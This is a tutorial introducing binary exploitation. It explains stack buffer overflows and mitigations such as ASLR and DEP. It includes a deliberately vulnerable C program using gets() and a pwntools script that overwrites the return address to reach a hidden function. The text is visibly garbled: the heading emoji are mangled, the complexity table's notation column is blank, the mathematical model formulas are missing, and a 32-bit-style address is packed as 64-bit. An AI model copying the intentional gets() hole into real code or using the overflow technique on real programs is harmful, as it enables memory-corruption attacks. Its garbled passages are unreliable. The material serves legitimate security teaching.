# Introduction to Binary Exploitation

## üìã Summary

### Core Concept

Binary exploitation is the process of identifying and leveraging vulnerabilities in compiled software to alter its intended execution flow. It focuses on how data is managed within a computer's memory‚Äîspecifically the stack and the heap‚Äîto gain unauthorized access or execute arbitrary code.

### Takeaways

* Exploitation often stems from a lack of proper **input validation** or memory management.
* Understanding low-level architecture (x86/x64) and assembly language is essential.
* Modern systems employ several mitigation techniques to make exploitation more difficult.

---

## üìñ Definition

**Binary Exploitation** (or "pwn") is a subfield of cybersecurity that involves finding bugs in a program's binary (the machine code) rather than its source code. Common targets include buffer overflows, format string vulnerabilities, and integer overflows.

---

## üìä Complexity Analysis

| Notation | Name | Growth Rate | Explanation |
| --- | --- | --- | --- |
|  | Constant | Stable | Accessing a memory address directly via a pointer. |
|  | Linear | Proportional | Scanning a buffer for a specific byte or null terminator. |
|  | Exponential | Rapid | Brute-forcing a 32-bit or 64-bit memory address or canary value. |

* **Worst-Case:** Attempting to bypass Address Space Layout Randomization (ASLR) without a memory leak, requiring a full brute-force of the entropy bits.
* **Best-Case:** Discovering a direct instruction pointer () overwrite via an unprotected buffer.
* **Average-Case:** Identifying a vulnerability and chaining it with a memory leak to calculate the base address of a library (like `libc`).

---

## ‚ùì Why we use it

Binary exploitation is studied for several critical reasons:

1. **Vulnerability Research:** To identify and patch security flaws before malicious actors can use them.
2. **Exploit Development:** To create "Proof of Concepts" (PoCs) that demonstrate the impact of a bug.
3. **Security Auditing:** To evaluate the effectiveness of OS-level protections like DEP (Data Execution Prevention) and ASLR.

---

## ‚öôÔ∏è How it works

The process generally follows a sequence of memory manipulation:

1. **Identify a Vulnerability:** Find a function that handles data unsafely (e.g., `gets()`, `scanf()`, or `strcpy()`).
2. **Determine the Offset:** Calculate the exact number of bytes needed to fill a buffer until the return address is reached.
3. **Control Execution Flow:** Overwrite the return address with a new address pointing to malicious code or a different function.

### Mathematical Model

In a simple stack-based buffer overflow, the memory layout can be visualized as:



If a user provides input  such that , the data will spill into the return address:


---

## üíª Usage / Program Example

### Vulnerable C Code (`vuln.c`)

This example demonstrates a classic buffer overflow where `gets()` does not check the length of the input.

```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You have successfully redirected execution!\n");
}

void vulnerable_function() {
    char buffer[64];
    printf("Enter some text: ");
    // Dangerous: gets() does not limit input size
    gets(buffer); 
}

int main() {
    vulnerable_function();
    return 0;
}

```

### Exploitation Strategy in Python (`exploit.py`)

Using the `pwntools` library to automate the overflow.

```python
from pwn import *

# Start the process
p = process('./vuln')

# Address of secret_function (found via objdump or gdb)
# Example address: 0x080484b6
target_addr = p64(0x080484b6) 

# Construct the payload: 64 bytes for buffer + 8 bytes for saved RBP
payload = b"A" * 72 + target_addr

p.sendline(payload)
print(p.recvall().decode())

```

---

## References

* *Hacking: The Art of Exploitation* by Jon Erickson.
* "Smashing The Stack For Fun And Profit" by Aleph One (Phrack Magazine).
* OWASP Binary Analysis and Exploitation guides.

---
